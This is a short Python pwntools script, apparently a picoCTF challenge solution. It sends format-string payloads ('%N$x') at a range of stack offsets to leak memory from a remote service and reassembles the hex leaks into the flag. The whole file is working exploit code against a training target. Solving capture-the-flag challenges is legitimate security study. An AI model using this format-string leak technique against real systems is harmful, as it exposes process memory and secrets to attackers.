from pwn import *
import codecs
context.log_level = 'critical'
output = ''
for i in range(10, 100):
    if('}' in output):
        break
    conn = remote('mercury.picoctf.net', 6989)
    conn.recvuntil("portfolio")
    conn.sendline(b'1')
    conn.recvuntil("?")
    conn.sendline(bytearray("%{}$x".format(i).encode()))
    conn.recvuntil(':')
    conn.recvline()
    leaked = conn.recvline()
    leaked = str(leaked.decode('utf-8'))[:-1]
    try:
        leaked_chrs = (codecs.decode(leaked, 'hex'))
        temp = ''
        for i in leaked_chrs:
            if(32 < i < 126):
                temp += chr(i)
        output += temp[::-1]
        print(output)
    except:
        print("cannot decode")
